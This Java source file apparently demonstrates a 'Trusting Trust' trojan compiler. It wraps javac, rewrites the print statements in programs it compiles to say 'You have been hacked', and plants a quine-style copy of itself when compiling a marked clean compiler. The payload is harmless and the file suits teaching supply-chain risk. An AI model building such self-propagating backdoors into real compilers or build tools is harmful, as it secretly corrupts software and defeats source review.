// 2jndaw9fiasndjf393u48fun24rj84jfu4h9

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.NoSuchElementException;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DirtyCompiler {
    private static final String CLEAN_COMPILER_IDENTIFIER = "// 2jndaw9fiasndjf393u48fun24rj84jfu4h9";
    private static final String SYSTEM_OUT_IDENTIFIER = "System.out.println([\"|\\w|\\W]+);";

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("File wasn't provided for compilation.");
            return;
        }

        String filePath = args[0];
        try {
            StringBuilder builder = new StringBuilder();

            // Loading the source file
            File program = new File(filePath);

            if (isCleanCompiler(program)) {
                getDirtyCompiler(program, builder);
            } else {
                getDirtyProgram(program, builder);
            }

            generateClassFile(program, builder);
            System.out.println("The compilation ended successfully.");
            System.out.println(getInstruction(program));

        } catch (FileNotFoundException ex) {
            System.out.println("File '" + filePath + "' not found.");
            System.out.println("Please make sure that the file path you have entered is a full path, " +
                "for ex. C:\\Users\\HelloWorld.java.");
        } catch (NoSuchElementException ex) {
            System.out.println("File '" + filePath + "' is empty");
        } catch (Exception ex) {
            System.out.println("Something Went Wrong. Error: " + ex);
        }
    }

    private static boolean isCleanCompiler(File program) throws FileNotFoundException {
        Pattern shebangPattern = Pattern.compile(CLEAN_COMPILER_IDENTIFIER);

        Scanner programScanner = new Scanner(program);
        String firstLine = new Scanner(program).nextLine();
        programScanner.close();

        return shebangPattern.matcher(firstLine).matches();
    }

    private static void getDirtyCompiler(File program, StringBuilder builder) {
        String dirtyCompilerContentRaw = getDirtyCompilerSourceCode();
        String dirtyCompilerContentRawAsClean = dirtyCompilerContentRaw.replace("class DirtyCompiler", "class " + replaceLast(program.getName(), ".java", ""));
        String dirtyCompilerContentRawAsCleanAsComment = dirtyCompilerContentRawAsClean.replace("\\", "\\\\");
        String dirtyCompilerContent = replaceLast(dirtyCompilerContentRawAsClean, "// insert the source code again", "return \"\"\"\n" + dirtyCompilerContentRawAsCleanAsComment + "\"\"\";");
        builder.append(dirtyCompilerContent);
    }

    private static void getDirtyProgram(File program, StringBuilder builder) throws FileNotFoundException {
        Pattern systemOutPattern = Pattern.compile(SYSTEM_OUT_IDENTIFIER);

        Scanner programScanner = new Scanner(program);
        while (programScanner.hasNextLine()) {
            String line = programScanner.nextLine();
            Matcher printLineMatcher = systemOutPattern.matcher(line.trim()); // we should check for substring
            if (printLineMatcher.matches()) {
                builder.append("System.out.println(\"You have been hacked\");\n");
            } else {
                builder.append(line);
                builder.append("\n");
            }
        }
        programScanner.close();
    }

    private static void generateClassFile(File program, StringBuilder builder) throws Exception {
        Path tempDirectory = Files.createTempDirectory(null);
        String tempFileName = Path.of(tempDirectory.toString(), program.getName()).toString();

        saveToTemp(builder, tempFileName);
        runOriginalCompiler(tempFileName);

        File tempClassFile = new File(replaceLast(tempFileName, "java", "class"));
        File ClassFile = new File(replaceLast(program.getPath(), "java", "class"));
        tempClassFile.renameTo(ClassFile);
    }

    private static void saveToTemp(StringBuilder builder, String tempFileName) throws IOException {
        FileWriter tempFileWriter = new FileWriter(tempFileName);
        tempFileWriter.write(builder.toString());
        tempFileWriter.close();
    }

    private static void runOriginalCompiler(String filePath) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process pr = rt.exec(String.format("javac %s", filePath));
        pr.waitFor();

        if (pr.exitValue() != 0) {
            throw new Exception(pr.toString());
        }
    }

    private static String replaceLast(String text, String target, String replacement) {
        int pos = text.lastIndexOf(target);
        if (pos > -1) {
            return text.substring(0, pos)
                + replacement
                + text.substring(pos + target.length());
        } else {
            return text;
        }
    }

    private static String getInstruction(File program) {
        String classFile = replaceLast(program.getName(), "java", "");
        String classPath = Path.of(program.getAbsolutePath()).getParent().toAbsolutePath().toString();
        return String.format("Run this to see results: java -cp %s %s", classPath, classFile);
    }

    private static String getDirtyCompilerSourceCode() {
        return """
// 2jndaw9fiasndjf393u48fun24rj84jfu4h9

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.NoSuchElementException;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DirtyCompiler {
    private static final String CLEAN_COMPILER_IDENTIFIER = "// 2jndaw9fiasndjf393u48fun24rj84jfu4h9";
    private static final String SYSTEM_OUT_IDENTIFIER = "System.out.println([\\"|\\\\w|\\\\W]+);";

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("File wasn't provided for compilation.");
            return;
        }

        String filePath = args[0];
        try {
            StringBuilder builder = new StringBuilder();

            // Loading the source file
            File program = new File(filePath);

            if (isCleanCompiler(program)) {
                getDirtyCompiler(program, builder);
            } else {
                getDirtyProgram(program, builder);
            }

            generateClassFile(program, builder);
            System.out.println("The compilation ended successfully.");
            System.out.println(getInstruction(program));

        } catch (FileNotFoundException ex) {
            System.out.println("File '" + filePath + "' not found.");
            System.out.println("Please make sure that the file path you have entered is a full path, " +
                "for ex. C:\\\\Users\\\\HelloWorld.java.");
        } catch (NoSuchElementException ex) {
            System.out.println("File '" + filePath + "' is empty");
        } catch (Exception ex) {
            System.out.println("Something Went Wrong. Error: " + ex);
        }
    }

    private static boolean isCleanCompiler(File program) throws FileNotFoundException {
        Pattern shebangPattern = Pattern.compile(CLEAN_COMPILER_IDENTIFIER);

        Scanner programScanner = new Scanner(program);
        String firstLine = new Scanner(program).nextLine();
        programScanner.close();

        return shebangPattern.matcher(firstLine).matches();
    }

    private static void getDirtyCompiler(File program, StringBuilder builder) {
        String dirtyCompilerContentRaw = getDirtyCompilerSourceCode();
        String dirtyCompilerContentRawAsClean = dirtyCompilerContentRaw.replace("class DirtyCompiler", "class " + replaceLast(program.getName(), ".java", ""));
        String dirtyCompilerContentRawAsCleanAsComment = dirtyCompilerContentRawAsClean.replace("\\\\", "\\\\\\\\");
        String dirtyCompilerContent = replaceLast(dirtyCompilerContentRawAsClean, "// insert the source code again", "return \\"\\"\\"\\n" + dirtyCompilerContentRawAsCleanAsComment + "\\"\\"\\";");
        builder.append(dirtyCompilerContent);
    }

    private static void getDirtyProgram(File program, StringBuilder builder) throws FileNotFoundException {
        Pattern systemOutPattern = Pattern.compile(SYSTEM_OUT_IDENTIFIER);

        Scanner programScanner = new Scanner(program);
        while (programScanner.hasNextLine()) {
            String line = programScanner.nextLine();
            Matcher printLineMatcher = systemOutPattern.matcher(line.trim()); // we should check for substring
            if (printLineMatcher.matches()) {
                builder.append("System.out.println(\\"You have been hacked\\");\\n");
            } else {
                builder.append(line);
                builder.append("\\n");
            }
        }
        programScanner.close();
    }

    private static void generateClassFile(File program, StringBuilder builder) throws Exception {
        Path tempDirectory = Files.createTempDirectory(null);
        String tempFileName = Path.of(tempDirectory.toString(), program.getName()).toString();

        saveToTemp(builder, tempFileName);
        runOriginalCompiler(tempFileName);

        File tempClassFile = new File(replaceLast(tempFileName, "java", "class"));
        File ClassFile = new File(replaceLast(program.getPath(), "java", "class"));
        tempClassFile.renameTo(ClassFile);
    }

    private static void saveToTemp(StringBuilder builder, String tempFileName) throws IOException {
        FileWriter tempFileWriter = new FileWriter(tempFileName);
        tempFileWriter.write(builder.toString());
        tempFileWriter.close();
    }

    private static void runOriginalCompiler(String filePath) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process pr = rt.exec(String.format("javac %s", filePath));
        pr.waitFor();

        if (pr.exitValue() != 0) {
            throw new Exception(pr.toString());
        }
    }

    private static String replaceLast(String text, String target, String replacement) {
        int pos = text.lastIndexOf(target);
        if (pos > -1) {
            return text.substring(0, pos)
                + replacement
                + text.substring(pos + target.length());
        } else {
            return text;
        }
    }

    private static String getInstruction(File program) {
        String classFile = replaceLast(program.getName(), "java", "");
        String classPath = Path.of(program.getAbsolutePath()).getParent().toAbsolutePath().toString();
        return String.format("Run this to see results: java -cp %s %s", classPath, classFile);
    }

    private static String getDirtyCompilerSourceCode() {
        // insert the source code again
    }
}
// nonce
""";
    }
}
// nonce
